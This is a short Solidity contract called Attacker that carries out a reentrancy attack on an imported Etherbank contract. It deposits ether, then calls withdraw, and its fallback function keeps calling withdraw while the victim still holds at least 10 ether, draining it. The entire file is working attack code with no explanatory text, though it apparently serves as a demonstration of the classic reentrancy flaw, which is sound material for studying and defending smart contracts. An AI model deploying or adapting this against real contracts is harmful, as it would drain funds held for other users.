pragma solidity ^0.4.19;

import "./Etherbank.sol";

contract Attacker {
    Etherbank victim;
    bool isAttack = false;

    event Withdrawl(address indexed from, uint256 value);

    event Deposit(address indexed to, uint256 indexed id, string value);

    constructor(address _etherbank) public {
        victim = Etherbank(_etherbank);
    }

    function deposit() public payable {
        emit Deposit(address(victim), 10, "Deposit");
        victim.deposit.value(msg.value)(address(this));
    }

    function attack() public {
        emit Withdrawl(address(victim), 10);
        victim.withdraw(10 ether);
    }

    function getEtherbankAddress() public view returns (Etherbank) {
        return victim;
    }

    function() public payable {
        if (address(victim).balance >= 10 ether) {
            victim.withdraw(10 ether);
        }
    }
}
